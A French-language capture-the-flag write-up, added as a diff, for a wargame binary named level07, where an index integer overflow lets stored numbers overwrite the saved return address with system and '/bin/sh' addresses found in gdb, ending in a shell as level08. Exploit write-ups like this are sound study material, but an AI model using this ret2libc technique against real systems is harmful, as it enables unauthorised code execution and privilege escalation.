@@ -1,0 +1,87 @@
+On a besoin d'écrire sur l'index 0
+
+Pour cela on sait que 0 = 4294967296
+
+Le programme divise par 4 notre d'index.
+
+4294967296 / 4 = 1073741824
+
+Input command: store
+ Number: 42
+ Index: 1073741824
+ Completed store command successfully
+Input command: read
+ Index: 0
+ Number at data[0] is 42
+ Completed read command successfully
+
+Ca fonctionne, on arrive à écrire sur l'index 0
+
+On ne peut pas injecter de shellcode dans notre environnement car le programme le modifie.
+
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+
+system address: 0xf7e6aed0
+
+(gdb) find &system,+99999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+
+/bin/sh address: 0xf7f897ec
+
+On peut donc utiliser system et /bin/sh
+
+
+On a besoin de trouver l'offset.
+Pour cela on commence par trouver l'EIP.
+
+(gdb) b *main
+Breakpoint 1 at 0x8048723
+(gdb) r
+Starting program: /home/users/level07/level07 
+
+Breakpoint 1, 0x08048723 in main ()
+(gdb) i f
+Stack level 0, frame at 0xffffd720:
+ eip = 0x804892b in main; saved eip 0xf7e45513
+ Arglist at 0xffffd718, args:
+ Locals at 0xffffd718, Previous frame's sp is 0xffffd720
+ Saved registers:
+  ebx at 0xffffd70c, ebp at 0xffffd718, esi at 0xffffd710, edi at 0xffffd714, eip at 0xffffd71c
+
+0xffffd71c est l'adresse de notre EIP
+
+
+(gdb) info registers
+eax            0xffffd554       -10924
+ecx            0xffffd600       -10752
+edx            0xffffd600       -10752
+ebx            0xffffd554       -10924
+
+0xffffd554 est l'adresse de notre array.
+
+On a donc:
+offset = 0xffffd71c - 0xffffd554 = 456/4 = 114
+system = 0xf7e6aed0 = 4159090384 -> 114 = 1073741938
+/bin/sh = 0xf7f897ec = 4160264172 -> 116 = 116
+
+On peut donc commencer à écrire notre tableau.
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
